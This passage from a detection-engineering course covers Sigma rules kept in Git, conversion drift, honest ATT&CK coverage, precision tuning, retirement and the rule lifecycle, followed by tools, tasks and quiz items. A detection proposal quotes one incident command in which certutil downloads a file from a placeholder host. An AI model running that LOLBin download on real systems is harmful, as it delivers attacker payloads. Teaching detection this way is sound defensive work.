  1. Field names translated correctly for the sysmon pipeline.       OK
  2. Wildcards expanded as expected; the ends-with is anchored.      OK
  3. Case sensitivity: Sigma values are case-insensitive by default.
     The generated query relies on the index's own behaviour.
     ACTION: confirm the field is analysed the same way in the
     target index, and record the answer next to the rule.        OPEN
  4. Backslash handling: the source uses '\certutil.exe' and the
     generated query uses '\\certutil.exe'. This is the expected
     escaping for this query language.                                OK

Verdict   Drift review complete except item 3. Do not promote to
          stable until item 3 is answered in writing.
```

**Item 3 in that record is the whole point of the exercise.** A field-by-field read is how you find the one thing the converter could not know, and writing the open question into the review is how it gets answered instead of forgotten.

### Part 6 — Coverage, and the honest limits of ATT&CK as a metric

#### Mapping rules to techniques

The mapping lives in the rule's tags, which is why check 7 in the review standard matters. Tags use the namespaced form `attack.<technique>`, for example `attack.t1105` for Ingress Tool Transfer — a technique in the Command and Control tactic. Use the **sub-technique** identifier when the behaviour is specific enough to warrant one.

| Mapping quality | Example | Why it is what it is |
|---|---|---|
| **Good** | `attack.t1105` on a rule about a tool downloading a remote payload | The behaviour and the technique actually correspond |
| **Weak** | `attack.command_and_control` alone | A tactic is a goal; many rules share it, so it measures nothing |
| **Wrong** | Tagging a tactic as though it were a technique | The coverage query silently miscounts |
| **Honest gap** | No tag, because it is an operational rule | A "SIEM is not ingesting" rule has no ATT&CK technique |

That last row is not a failure. Some of your most valuable rules are operational rather than adversarial, and forcing a technique tag onto them corrupts the map. **Say so in the repository.** Do not hide it in a footnote.

#### The three levels, and the one that matters

A coverage number computed from tags alone is close to meaningless, because a tag says a detection was written, not that it works. Score coverage at three levels.

| Level | What it means | How you know |
|---|---|---|
| **Telemetry** | You collect the data that would show this behaviour | A query against the index returns events of that type |
| **Detection** | A rule exists that matches the behaviour | A rule with this tag is deployed and green |
| **Coverage** | The rule is validated, the queue is owned, and someone acts | A test that fires and a named owner for the resulting alerts |

**Only the third level is coverage.** The first is a prerequisite, the second is an intention, and the gap between them is where most overclaiming lives. A matrix with 200 techniques coloured green because a rule carries the tag is a document that will embarrass its author the first time a real intrusion walks through a green square.

#### Building the coverage view honestly

```bash
# List the technique tags actually present in the repository.
grep -rho 'attack\.t[0-9]\{4\}\(\.[0-9]\{3\}\)\?' rules/ \
  | sort | uniq -c | sort -rn
```

```text
COVERAGE SUMMARY — quarterly, honest version

Techniques in scope for this estate (chosen, not all of ATT&CK)   62

  Telemetry present                          41 of 62   (66%)
  A rule exists with this tag                28 of 62   (45%)
  Rule validated AND queue owned             19 of 62   (31%)

Rules with no ATT&CK tag, and why
  Operational health rules (agent down, logging gap)      6
  Compliance-oriented rules with no technique mapping     3

Deliberate exclusions
  Techniques that require telemetry we have decided not to
  collect, with the decision and its date recorded             7

The number to quote: 31%, not 66%. The other two numbers describe
what we have started, not what we can do.
```

**The last line is the sentence that makes the whole document credible.** Anyone can produce a large number. Producing the small number and explaining exactly why the larger ones do not count is what a senior engineer does.

#### Common failure: coverage as a vanity metric

**Common failure.** The team reports "we cover 78% of ATT&CK" and cannot say 78% of what.

| What it looks like | What it actually measures | The consequence |
|---|---|---|
| "We cover 78% of ATT&CK" | 78% of an undefined denominator | The number is unfalsifiable, so it survives scrutiny it should not |
| A matrix almost entirely green | Tag presence | A real intrusion through a green square destroys the document's credibility |
| Counting techniques, not behaviours | Breadth of labelling | A single rule covering one sub-technique counts the same as a campaign-level detection |
| Never revising the map downwards | Optimism | Nobody trusts the next version |

**The fix is to always publish the denominator and the level.** "19 of 62 in-scope techniques have a validated rule with an owned queue, against a stated scope of 62" is a claim someone can check, argue with, and improve.

### Part 7 — Rule quality, tuning, and precision

#### False positives are a measurement, not an insult

A false positive is a match the rule was not designed to produce. The number that matters is **precision**: of the alerts a rule produced in a period, what fraction were the thing you wrote the rule to catch?

```text
PRECISION MEASUREMENT — DET-042, certutil remote download
Period: 2026-06-01 to 2026-06-30

Total matches                       34
Confirmed malicious                  1
Confirmed benign                    29
Undetermined, closed as benign       4

Precision = 1 / 34 = 3%

Benign causes observed, grouped
  Certificate revocation list retrieval by the PKI service      22
  Software deployment scripts using urlcache                    5
  Administrator troubleshooting, verified by interview          2

Reading
  3% precision is not survivable as a paging rule. The benign
  causes are one dominant source, which is fixable, rather than
  a long tail, which is not. This is a tuning candidate, not a
  retirement candidate.
```

**Grouping the benign causes before deciding is the step people skip.** Twenty-two alerts from one cause is a tuning problem with a clean fix. Five alerts from five different causes is a rule that will never be precise enough to page on, and the right answer may be to demote it rather than tune it.

#### Tuning as a documented change

**A tuning edit is a commit, not a keystroke in a console.** The format below is what makes it reviewable, and it is the difference between an exclusion somebody can evaluate and an exclusion somebody has to take on trust.

```text
TUNING RECORD — DET-042 v1.0 → v1.1
Date:          2026-07-02
Author:        Your Name
Reviewer:      Peer Reviewer
Reason:        Precision measured at 3% over June 2026; 22 of 29
               benign matches came from one cause.

Change
  Added filter_main_pki_crl:
    ParentImage|endswith: '\svchost.exe'
    User|endswith: '$'
    CommandLine|contains: '-urlcache'

Evidence
  All 22 excluded matches were confirmed benign by checking the
  CRL endpoint against the internal PKI service inventory. The
  endpoint resolves to an internal certificate authority host.
  The filter requires all three conditions, so a malicious use of
  certutil from a SYSTEM-context svchost parent that is not
  retrieving a CRL would still match.

Deliberately still matching
  Deployment scripts and administrator troubleshooting. These are
  one-off, low-volume, and excluding them would require matching on
  specific script paths, which an attacker could then imitate.

Expected effect
  June volume of 34 falls to roughly 9. Precision should rise from
  3% to approximately 11%.

Re-measurement
  Due 2026-08-02. Owner: Your Name. If precision is still below
  25% after 30 days, DET-042 is demoted from paging to hunting.
```

Four things in that record matter. **The change is a diff, not a description** — you can read what moved. **The evidence names how each exclusion was verified.** That is the difference between tuning and guessing.

**The deliberately-still-matching section admits the residual noise**, so nobody is surprised later. And **the re-measurement has a date and an owner**, which converts a hope into a check.

#### Why the filter is named `filter_main_`

SigmaHQ's own rule conventions recommend naming filters either `filter_main_*` for exclusions that are mandatory to the rule's logic or cover behaviour present by default, or `filter_optional_*` for exclusions based on software that is not part of a default installation. The convention exists so a reader can tell, from the name alone, how much of the rule's precision depends on a locally-added exclusion.

| Filter prefix | Means | Risk if the target software changes |
|---|---|---|
| `filter_main_*` | This exclusion is core to the rule working | Low — the behaviour is stable |
| `filter_optional_*` | This exclusion is environment-specific | High — an upgrade can silently change behaviour |

#### Sigma filters: tuning ten rules without editing ten rules

When the same benign cause affects several rules, a **Sigma filter** — a meta-rule — applies one exclusion to many rules in a single place. This is the mechanism that stops you from copy-pasting an exclusion into every rule that matches an internal tool.

```yaml
title: Filter Internal Configuration Management Scripts
description: >
  Excludes activity generated by the internal configuration management
  agent, which triggers several process creation rules legitimately.
logsource:
  category: process_creation
  product: windows
filter:
  rules:
    - 3f7b2c91-84ae-4d16-9a05-1e6c8b7d4a52
    - 8c41d0e2-5b73-4a09-9f18-2d6e7a4b1c03
  selection:
    ParentImage|endswith: '\cfgmgmt-agent.exe'
  condition: selection
```

**The trade-off is explicit**: one reviewed exclusion instead of two rule edits, at the cost that the exclusion now applies to every rule listed and can be widened by accident. A meta-filter is reviewed with more care than a rule edit, not less, because its blast radius is larger.

#### Retirement: the decision nobody wants to make

**The detection nobody dares delete is one of the three classic anti-patterns**, and it exists because deletion feels like an accusation. It is not. Retirement is a normal outcome, and it needs a written case just like a tuning change.

| Retirement reason | Evidence required |
|---|---|
| Superseded by a better rule | The replacement's rule ID and what it covers that this did not |
| Telemetry no longer collected | The source, and the decision that retired it |
| Precision cannot be made acceptable | At least two measured periods, with the benign causes grouped |
| Technique no longer relevant to this estate | The estate change, dated |
| Duplicate coverage | The other rules, and a demonstration that they cover the same cases |

```text
RETIREMENT RECORD — DET-018
Date:        2026-07-15
Rule:        DET-018, suspicious archive creation in user directories
Decision:    Retire, and delete from the deployment target.

Evidence
  Precision over the last two measured periods:
    April 2026   6 of 412 matches confirmed      1.5%
    May 2026     2 of 388 matches confirmed      0.5%
  Benign causes are a long tail: 17 distinct software packages
  and 9 installer paths, with no cause above 12% of the volume.

Superseded by
  DET-057, which detects the same behaviour with an additional
  condition on the destination directory and measured 34%
  precision over the same two months. DET-057 covers 5 of the 8
  confirmed matches from these two months.

Accepted loss
  3 confirmed matches in two months from the retired rule are not
  covered by DET-057. This is recorded as a known gap in the
  coverage summary, not as a reason to keep a 1% precision rule.

Approved by   Detection Lead, 2026-07-16
```

**The `Accepted loss` section is what makes this a professional decision rather than a deletion.** Every retirement loses something. Naming it, quantifying it, and recording it in the coverage summary is the difference between managing a library and pruning it by feel.

### Part 8 — The lifecycle, end to end

#### The stages and who owns what

This is the table the whole phase builds toward. If you take one artefact away, take this one, adapted to the roles you actually have.

| Stage | Trigger | Artefact produced | Owner | Exit condition |
|---|---|---|---|---|
| **Propose** | An incident, a gap, a technique, or a hunt finding | An issue with the behaviour, the data source, and the reason | Requesting analyst | Someone accepts it as worth building |
| **Author** | An accepted proposal | The rule file plus positive, negative, and near-miss fixtures | Detection engineer | The rule converts and the fixtures exist |
| **Test** | A rule in a branch | A green pipeline: validated, tested, converted for every target | Detection engineer | Every gate passes |
| **Review** | A PR requesting merge | A review record with checks, a decision, and conditions | A second engineer | Approve, or approve with dated conditions |
| **Deploy** | A merged rule | The converted query applied, with the rule ID recorded | Detection engineer or platform owner | The rule is live and its ID maps to the deployed query |
| **Monitor** | A deployed rule | Volume and precision measurements, at an agreed cadence | Detection engineer | Measured at least once, with the number written down |
| **Tune** | Precision below an agreed threshold | A tuning record: the diff, the evidence, the re-measure date | Detection engineer | Re-measured after 30 days |
| **Retire** | Superseded, or unfixable precision | A retirement record with evidence and accepted loss | Detection lead | Deleted from the target, gap recorded in coverage |
| **Review cycle** | A review date arrives | Confirmation that the rule is still wanted, or a decision to change it | Named rule owner | The `modified` date or the `status` changes |

**The `Monitor` row is the one most teams skip and the one that makes everything else work.** Without a measurement, tune and retire both become matters of opinion, and opinion is what the rest of this phase exists to replace.

#### The lifecycle registry

Keep a flat file next to the rules. It is the thing a manager reads and the thing that makes a review date enforceable.

```csv
rule_id,title,owner,status,deployed,last_reviewed,review_due,precision_30d,attck,notes
DET-042,Certutil remote download,Your Name,stable,2026-05-14,2026-07-02,2026-10-02,11%,T1105,tuned twice
DET-057,Archive creation in user dirs,Peer Reviewer,stable,2026-06-01,2026-06-01,2026-09-01,34%,T1560,replaced DET-018
DET-018,Suspicious archive creation,None,retired,2026-02-10,2026-07-15,NA,0.5%,T1560,retired 2026-07-15
```

**A review date that nothing enforces is a wish.** Two mechanisms enforce it: a scheduled CI job that fails if any rule's `review_due` is in the past, and a line in the weekly team meeting that reads the overdue list aloud.

```python
# tools/check_review_dates.py
"""Fail if any active rule is past its review date. Run weekly in CI."""
import csv
import sys
from datetime import date

with open("registry/lifecycle.csv", encoding="utf-8") as handle:
    rows = list(csv.DictReader(handle))

today = date.today()
overdue = []
for row in rows:
    if row["status"] == "retired":
        continue
    due = row["review_due"].strip()
    if not due or due == "NA":
        overdue.append((row["rule_id"], "no review date set"))
        continue
    if date.fromisoformat(due) < today:
        overdue.append((row["rule_id"], f"review was due {due}"))

for rule_id, reason in overdue:
    print(f"OVERDUE  {rule_id}: {reason}")

sys.exit(1 if overdue else 0)
```

#### Anti-patterns, and what each one costs

| Anti-pattern | What it looks like | Why it happens | The repair |
|---|---|---|---|
| **The giant untested rule** | One rule with thirty conditions and no fixtures | It grew by accretion; every addition was easier than a new rule | Split it by behaviour, and give each part its own fixtures |
| **The rule only the author understands** | `condition: sel1 and not (f2 or f3) and sel4` | The author knew the context and did not write it down | Rewrite the condition with named selections and a description in prose |
| **The detection nobody dares delete** | A rule with 1% precision and an owner who left | Deleting feels like an accusation, and nobody has the evidence | A retirement record with measured evidence and accepted loss |
| **The exclusion nobody reviewed** | `filter` conditions accumulated over two years | Each was added urgently, directly in the console | Move tuning into commits, and require evidence per exclusion |
| **The copy-pasted rule** | Four near-identical rules differing in one string | Copying was faster than refactoring | Merge into one rule with a value list, or use a filter |
| **The orphaned tag** | ATT&CK tags that no longer match the logic | The logic was tuned and the tag was not | Validate tags in CI against the rule description |
| **The secret in the repo** | A rule containing an internal API key or a lookup credential | Convenience | Never commit credentials; use the platform's secret store |

**The figure in the third row matters more than the others.** A rule nobody will delete is a permanent tax on every analyst who will ever work your queue, and the reason it survives is almost never technical. It survives because no one has produced the evidence that would make deletion a decision rather than an insult.

**Environment-specific values deserve their own rule, because they are the half of this problem that is easy to miss.** A rule that hardcodes your domain, your server naming pattern, or an internal subnet is a rule that cannot be shared, cannot be tested against a fixture from anywhere else, and silently stops matching the day the naming convention changes.

The fix is the same shape as the filter mechanism earlier: keep the *logic* in the rule and move the environment-specific *values* into a pipeline or a lookup the deployment supplies. That is what makes a rule portable between your test tenant and production — and it is why "does this rule contain anything that is true only here?" is one of the twelve review checks.

### Part 9 — What the repository looks like when it works

#### The end-to-end worked example

Follow one detection through the whole lifecycle. This is the path the practice tasks repeat on a rule of your own.

**The proposal.** An incident review finds that a loader retrieved a second-stage payload with certutil, and no rule existed. The proposal is an issue, not a rule.

```text
DETECTION PROPOSAL — DET-042
Proposed by    Analyst who worked INC-2026-0412-03

Behaviour      certutil.exe invoked with a URL argument, retrieving a
               file to disk. Observed in the incident as:
               certutil.exe -urlcache -split -f http://<host>/a.dat

Data source    Sysmon Event ID 1, process creation, command line and
               parent image. Already collected, 90-day retention.

Why now        The technique appeared in the incident and is not
               exotic. It also appears in public reporting as a
               common loader step, so it is likely to recur.

Related rules  DET-011 covers PowerShell download cradles. It does not
               cover certutil or other signed Windows binaries.

ATT&CK         T1105, Ingress Tool Transfer.

Proposed owner Your Name
```

**The authoring.** The rule, three fixtures, and a conversion check for each declared target — all on a branch, all in one commit series.

**The review.** A second engineer works the twelve checks. Two fail.

```text
REVIEW RECORD — DET-042
Reviewer      Peer Reviewer
Date          2026-05-12
Decision      Approve with conditions

Checks
  Purpose            pass
  Telemetry          pass — Sysmon Event ID 1 collected, 90-day retention
  Precision          FAIL — falsepositives listed only as "Unknown"
  Fields             pass
  Logic              pass
  Severity           pass — level medium is right for a loader step
  Mapping            pass — attack.t1105 is a technique, not a tactic
  Tests              pass — true, false, and near-miss fixtures all present
  Cost               FAIL — no volume estimate
  Duplication        pass — no overlap with DET-011
  Lifecycle          pass — owner named, review due 2026-10-02 (three months on from the last review on 2026-07-02, per the registry)
  Response           pass — triage note attached

Conditions
  1. Replace the falsepositives entry with the two concrete benign
     causes the author already knows about: CRL retrieval by the PKI
     service, and deployment scripts using urlcache.
     Owner: author. Due before merge.
  2. State an expected volume. Do not guess a number: sample 7 days
     of retained process creation logs for certutil with a URL and
     record the count. Owner: author. Due 2026-05-16.
  3. Deploy at level medium, routed to the analyst queue, with a
     30-day precision measurement due 2026-06-12.
```

**Look at condition 2.** The reviewer refused to accept an invented number and asked for a seven-day sample instead. That single instruction converts a guess into a measurement, and it is the kind of thing a review standard makes normal rather than personal.

**The deployment, monitor, tune, and retirement.** Six weeks of measurement produced 3% precision, the tuning record in Part 7 raised it to 11%, and a second tuning pass brought it to 31% — above the threshold, so it stays. If it had not, the retirement record was the next artefact.

| Stage | Artefact in the repository | What it proves |
|---|---|---|
| Propose | `proposals/DET-042.md`, or a closed issue | The rule has a reason with an incident ID |
| Author | `rules/windows/process_creation/proc_lolbin_certutil_download.yml` | The change is a readable diff |
| Test | `tests/samples/proc_lolbin_certutil_download.*.json` and the pipeline run | The rule is verified before it can merge |
| Review | `reviews/DET-042.md` | A second person read it and imposed conditions |
| Deploy | The rule ID recorded against the deployed query | You can map a firing alert back to the source |
| Monitor | `registry/lifecycle.csv`, precision columns | Someone measured it |
| Tune | `tuning/DET-042-2026-07.md` | The exclusion has evidence and a re-measure date |
| Retire | `retired/DET-018.md` | Deleting was a decision, not an accident |

#### Why this survives your departure

The point of the whole exercise is that the library stops depending on any individual's memory.

| Question a new engineer asks | Where they find the answer |
|---|---|
| Why does this rule exist? | The proposal, or the commit message |
| What breaks if I change it? | The fixtures |
| Who do I ask? | The `owner` in the registry |
| Is it any good? | The `precision_30d` column |
| Can I delete it? | The retirement criteria, and the coverage summary |
| What does it actually run as? | The conversion artifact for the deployed target |

**That table is the deliverable.** Not the pipeline, not the YAML, not the badge on the repository. Those are how you produce it.

### What you still cannot do after this phase

Your repository is yours, your data is small, and nobody has tried to break your pipeline.

You can now take a detection from a proposal to a validated, tested, reviewed, deployed rule with a measured precision figure and a written lifecycle.

You **cannot** yet operate this at organisational scale. You have not run a detection library with several engineers committing at once, argued with a platform team about deployment access, or defended a coverage claim to an auditor.

| You can | You cannot yet |
|---|---|
| Build a pipeline that blocks a broken rule from merging | Negotiate deployment credentials and a rollback path with a platform team |
| Write fixtures that catch a logic regression | Prove a rule catches the technique in your real environment |
| Convert a rule and read the output for drift | Run conversion as a scheduled job across hundreds of rules in production |
| Measure precision over a month for one rule | Build a cost model across a whole library and defend it at budget time |
| Map coverage at three levels for a chosen scope | Defend a coverage denominator to a regulator or an external auditor |
| Retire a rule with evidence | Handle the organisational conversation when the rule was someone's project |

**In an interview, say:** “I run my detections as code — Sigma rules in Git, fixtures for positive, negative, and near-miss cases, a CI pipeline that validates with `sigma check` and runs the tests, and conversion artifacts for each backend. I have measured precision on my own rules and retired one with a written case.”

“I have not operated this across a team, and I have not automated deployment to production, because I did not want to automate a step before I could describe its rollback.”

The last sentence is the one that lands: naming what you deliberately did not automate reads as judgement, not as a gap.

### Key takeaways

- **A detection is production logic, and it is usually the only production logic in your organisation with no diff, no test, and no reviewer.** That asymmetry, not any tool choice, is the problem this phase solves.
- **Detection debt is paid in analyst minutes.** One rule firing 200 times a month at four minutes each costs roughly $7,200 a year — which is the argument that funds the fix.
- **Version control only helps if the commit message names the reason.** "Add rule" tells a future reader nothing; "addresses INC-2026-0412-03" tells them exactly what they need to decide whether to keep it.
- **Organise rules by telemetry source, never by threat actor, severity, or tactic.** Log sources are stable; actor names, severities, and tactic mappings all change.
- **A rule needs metadata that survives an audit** — `id`, `status`, `description`, `references`, `falsepositives`, `level`, `tags`, and `modified`. The `falsepositives` list is the field that decides whether the first analyst to hit one concludes the rule is broken.
- **Three fixtures per rule is the working minimum:** a positive, a negative, and a near-miss. The near-miss is the one that catches the broadening edit six months from now.
- **A fixture test proves the logic matches the events you gave it, and nothing more.** It does not prove the telemetry is collected or that the technique is caught. Say so rather than overclaiming.
- **`sigmac` is the retired legacy toolchain.** pySigma describes itself as its replacement and `sigma-cli` as the command-line equivalent. Use `sigma-cli`.
- **`sigma check` fails on errors by default but passes on issues unless you pass `--fail-on-issues`.** If you want an empty `falsepositives` list to block a merge, you must ask for the stricter behaviour.
- **A backend and a pipeline are different things.** The backend knows the query language; the pipeline knows your field names. A backend without the right pipeline produces a query that looks correct and matches nothing.
- **Conversion drift is real and only sometimes a bug.** Unsupported features, missing pipelines, coarser matching, and clock-aligned correlation windows all produce a deployed query that differs from the rule you wrote — so read the output once per new target.
- **Only the third coverage level is coverage:** telemetry present, then a rule written, then a validated rule with an owned queue. Report the smallest number and explain why the larger ones do not count.
- **Always publish the denominator.** "19 of 62 in-scope techniques" is a claim someone can check. "We cover 78% of ATT&CK" is unfalsifiable and will embarrass its author.
- **Group benign causes before deciding whether to tune.** Twenty-two alerts from one cause is a clean fix; five alerts from five causes may mean the rule should never page at all.
- **A tuning edit is a commit with evidence, not a keystroke in a console.** The record names the diff, how each exclusion was verified, what deliberately still matches, and when it will be re-measured.
- **Retirement is a normal outcome, and it needs a written case.** The `accepted loss` section — what stops being detected — is what makes deletion a professional decision rather than an accident.
- **The anti-pattern that costs the most is the rule nobody dares delete.** It survives because deleting feels like an accusation, not because it has value, and the fix is evidence rather than authority.
- **The pipeline's job is to make a broken rule impossible to merge.** Everything else it does is a bonus, and `if-no-files-found: error` on the artifact step guards the failure where an empty output goes green.
- **The library should answer a new engineer's questions without a person.** Why it exists, what breaks if you change it, who owns it, whether it works, and whether you may delete it — all from the repository.

### Practice this next

The eleven tasks build one artefact: your own detection library, under version control, with a pipeline and a lifecycle. The order follows the work — you cannot test a rule you have not written, and you cannot measure a rule you have not deployed.

1. **Inventory and choose** (task 1). List every rule in your queue, mark each as clearly good, clearly noisy, or not understood, and pick three to migrate first. That selection is the phase's scope decision.
2. **Stand up the repository** (task 2) with the layout in Part 2, and migrate those three rules as real Sigma files with complete metadata. Do not migrate a fourth until these three are finished.
3. **Write nine fixtures** (task 3) — a positive, a negative, and a near-miss for each of the three rules. Every near-miss should be an event that a careless future edit would wrongly catch.
4. **Build the test harness** (task 4) with pytest, and make it fail. Break a rule's condition deliberately, watch the test go red, and then fix it. A test you have never seen fail is a test you do not know works.
5. **Wire the pipeline** (task 5) as a GitHub Actions workflow that validates with `sigma check`, runs the tests, converts for two targets, and uploads the artifacts. Then open a PR that deliberately breaks a rule and confirm CI blocks it.
6. **Convert and read** (task 6). Convert all three rules for two backends and produce a drift review for each, field by field, like the record in Part 5. Record at least one open question you cannot answer alone.
7. **Map the coverage** (task 7) for a chosen scope — telemetry, detection, and coverage, just like Part 6. Publish the denominator and the smallest number, and name the techniques you deliberately excluded and why.
8. **Measure precision** (task 8) for one deployed rule over at least 30 days. Group the benign causes, and write the sentence that says whether this is a tuning candidate or a retirement candidate.
9. **Tune and re-measure** (task 9), or write the retirement record if the evidence says tune would not help. Either artefact is a full pass; choosing the wrong one is the only failure.
10. **Write the lifecycle table and the anti-pattern audit** (task 10). Adapt the Part 8 table to the roles you actually have, and go through your queue naming every instance of the seven anti-patterns with a repair for each.
11. **Keep the review sweep alive** (task 11). Schedule the overdue-date check in CI so it runs weekly, and leave it running after the phase ends. A review date that nothing enforces is a wish.

Then open `portfolio/advance/07-detection-as-code.md` and assemble the deliverables. **The phase is done when one detection rule has travelled the whole lifecycle in a repository** — proposed, authored, tested, reviewed, deployed, measured, tuned or retired — and when every step of that journey left evidence a stranger could read.

## Tools for This Phase

| Tool | What it does | Cost | Official link | Mini-task | Free alternative |
|---|---|---|---|---|---|
| Git | Version control for rules, tests, and the lifecycle registry | Free/open-source | https://git-scm.com/ | Commit three real rules with messages that name the reason each exists | Mercurial, or Fossil |
| GitHub Actions | CI that validates, tests, and converts rules on every pull request | Free for public repositories, with a monthly minute allowance for private ones | https://github.com/features/actions | Add the workflow from Part 4 and confirm it blocks a deliberately broken rule | GitLab CI, or a local `pre-commit` hook plus `git hook run` |
| sigma-cli | Converts Sigma rules to backend query languages and validates them | Free/open-source | https://github.com/SigmaHQ/sigma-cli | Run `sigma check --fail-on-error --fail-on-issues rules/` on your migrated rules | Hand-written queries per platform, kept in Git |
| pySigma | The Python library underneath the CLI, usable directly in your own tests | Free/open-source | https://github.com/SigmaHQ/pySigma | Parse a rule in Python and print its `detection` selections | Parse the YAML yourself with PyYAML |
| pySigma backend plugins | Per-platform conversion targets, installed on demand | Free/open-source | https://github.com/SigmaHQ/pySigma-backend-splunk | Install the Splunk backend and convert one rule with a pipeline | `sigma list backends` to see what is already available |
| pytest | The test harness for rule logic and fixture matching | Free/open-source | https://pytest.org/ | Make a test fail by breaking a rule condition, then fix it | Python's built-in `unittest` |
| yamllint | Catches YAML syntax problems before the CI runner does | Free/open-source | https://yamllint.readthedocs.io/ | Lint the `rules/` tree and fix every finding | `python -c "import yaml,sys; yaml.safe_load(open(sys.argv[1]))"` |
| SigmaHQ rule repository | Several thousand peer-reviewed rules to read and adapt | Free, under the Detection Rule License | https://github.com/SigmaHQ/sigma | Take one community rule, convert it, and review it against your twelve checks | Elastic detection rules, or Splunk security content |
| ATT&CK Navigator | Renders coverage as a layer you can colour and export | Free | https://mitre-attack.github.io/attack-navigator/ | Build a layer with your three coverage levels marked separately | A Markdown table with the same three columns |
| MITRE ATT&CK | The technique catalogue your rule tags map onto | Free | https://attack.mitre.org/ | Find the correct sub-technique ID for three behaviours and tag your rules | Search the ATT&CK STIX data offline |
| Atomic Red Team | Small, documented tests that generate the telemetry your rules expect | Free/open-source | https://github.com/redcanaryco/atomic-red-team | Run one atomic test in a lab VM and check whether your migrated rule fires | Manual command execution following the ATT&CK procedure examples |
| Chainsaw | Runs Sigma rules against exported event logs, no SIEM required | Free/open-source | https://github.com/WithSecureLabs/chainsaw | Hunt a folder of exported EVTX files with your `rules/` directory | Hayabusa with the same rule set |

## Free/cheap resources

- Sigma project home — https://sigmahq.io/
- Sigma rules specification — https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-rules-specification.md
- Sigma correlation rules specification — https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-correlation-rules-specification.md
- Sigma filters specification — https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-filters-specification.md
- SigmaHQ rule conventions — https://github.com/SigmaHQ/sigma-specification/blob/main/sigmahq/sigmahq-rule-convention.md
- SigmaHQ rule repository — https://github.com/SigmaHQ/sigma
- SigmaHQ contributing guide, including the CI validation commands — https://github.com/SigmaHQ/sigma/blob/master/CONTRIBUTING.md
- sigma-cli — https://github.com/SigmaHQ/sigma-cli
- pySigma — https://github.com/SigmaHQ/pySigma
- pySigma documentation — https://sigmahq-pysigma.readthedocs.io/
- pySigma Splunk backend — https://github.com/SigmaHQ/pySigma-backend-splunk
- pySigma Elasticsearch backend — https://github.com/SigmaHQ/pySigma-backend-elasticsearch
- pySigma Sysmon pipeline — https://github.com/SigmaHQ/pySigma-pipeline-sysmon
- Elastic detection rules — https://github.com/elastic/detection-rules
- Splunk security content — https://github.com/splunk/security_content
- Palantir alerting and detection strategy framework — https://github.com/palantir/alerting-detection-strategy-framework
- MITRE ATT&CK — https://attack.mitre.org/
- ATT&CK Navigator — https://mitre-attack.github.io/attack-navigator/
- Atomic Red Team — https://github.com/redcanaryco/atomic-red-team
- Chainsaw — https://github.com/WithSecureLabs/chainsaw
- Hayabusa — https://github.com/Yamato-Security/hayabusa
- GitHub Actions documentation — https://docs.github.com/en/actions
- pytest documentation — https://docs.pytest.org/
- pre-commit — https://pre-commit.com/
- yamllint — https://yamllint.readthedocs.io/
- Detection Engineering Weekly — https://www.detectionengineering.net/
- The DFIR Report — https://thedfirreport.com/
- Google SRE Book, on release engineering and rollback — https://sre.google/sre-book/table-of-contents/

## Hands-on practice tasks

1. Inventory every rule in your queue, classify each as good, noisy, or not understood, and choose three to migrate first. <!-- id: advance-07-t01 band: quick energy: low -->
2. Create the repository with the Part 2 layout and migrate those three rules as Sigma files with complete metadata. <!-- id: advance-07-t02 band: focused energy: normal -->
3. Write nine fixtures — a positive, a negative, and a near-miss for each of the three migrated rules. <!-- id: advance-07-t03 band: deep energy: high -->
4. Build the pytest harness, break a rule condition deliberately, and confirm the test fails before you fix it. <!-- id: advance-07-t04 band: focused energy: normal -->
5. Wire a GitHub Actions workflow that validates, tests, converts, and uploads artifacts, then confirm it blocks a broken rule. <!-- id: advance-07-t05 band: deep energy: high -->
6. Convert all three rules for two backends and write a field-by-field drift review for each, recording any open question. <!-- id: advance-07-t06 band: focused energy: normal -->
7. Map coverage at three levels for a chosen scope, publish the denominator, and name your deliberate exclusions. <!-- id: advance-07-t07 band: deep energy: high -->
8. Measure precision for one deployed rule over at least 30 days, grouping the benign causes before you decide anything. <!-- id: advance-07-t08 band: deep energy: high -->
9. Either tune the rule with a full tuning record and a re-measurement date, or write the retirement record with its accepted loss. <!-- id: advance-07-t09 band: deep energy: high -->
10. Adapt the lifecycle table to the roles you actually have and audit your queue against the seven anti-patterns, with a repair for each. <!-- id: advance-07-t10 band: focused energy: normal -->
11. Start a recurring weekly sweep that fails when any active rule is past its review date, and keep it running. <!-- id: advance-07-t11 band: ongoing energy: low -->

## Deliverable / proof of work

Create `portfolio/advance/07-detection-as-code.md` with:

- A repository layout, plus three real rules migrated as Sigma files with full metadata and reason-bearing commit messages
- Nine fixtures across the three rules: one positive, one negative, and one near-miss each
- A pytest harness, with evidence of one test failing before a deliberate break was fixed
- A GitHub Actions workflow that validates with `sigma check`, runs the tests, converts, and uploads artifacts
- A screenshot or log of the pipeline blocking a pull request that contains a broken rule
- A drift review for each rule against each converted backend, field by field, including any open question
- A three-level coverage map for a chosen scope, with the denominator stated and deliberate exclusions named
- A 30-day precision measurement for one deployed rule, with the benign causes grouped
- Either a full tuning record with evidence and a re-measurement date, or a retirement record with its accepted loss
- A lifecycle table adapted to your organisation, with an owner and an exit condition at every stage
- A lifecycle registry file covering every rule you have migrated
- An anti-pattern audit naming each instance in your queue with a repair for each
- A scheduled review-date check that fails when an active rule is past its review date, left running in CI

## Quiz

Twelve questions on the material in this phase. Each has one correct answer and a short explanation — read the explanation even when you get it right, because it usually names the mistake the wrong answers represent.

The self-check in Part 1 asked you to *name* these things from nothing. This asks you to *recognise* the right one among plausible alternatives, which is how an interview or a review conversation will test the same knowledge — and several of these questions turn on the exact fixture and rule logic in Part 3, so read them slowly.

### Q1. A console-managed detection library has rotted for two years. What is the phase's stated reason the fix has to be structural rather than motivational? <!-- id: advance-07-q01 energy: normal -->

- [ ] The analysts were not trained on the console
- [x] Nothing in the decay ever looked like a mistake — every edit was reasonable, made by a competent person under time pressure
- [ ] The vendor console lacked the features needed to maintain rules
- [ ] The team had no manager enforcing a review process

**Why:** The phase is precise that the library accretes rather than being sabotaged: an exclusion added at 4pm because the queue was on fire is a sensible act whose accumulated result is an unexplainable rule. The training and management answers blame the people, which the phase explicitly rules out; the vendor answer blames the product, and the phase says a commercial detection platform can be excellent and still leave you with this problem because the problem is process, not product.

### Q2. You have a repository, tests, and a pipeline, but no owners, review dates, or retirement criteria. What does the phase say you have? <!-- id: advance-07-q02 energy: low -->

- [x] A beautifully maintained library of rules nobody has decided to keep
- [ ] A tidier console
- [ ] A completed detection-as-code migration
- [ ] A pipeline that proves the rules work

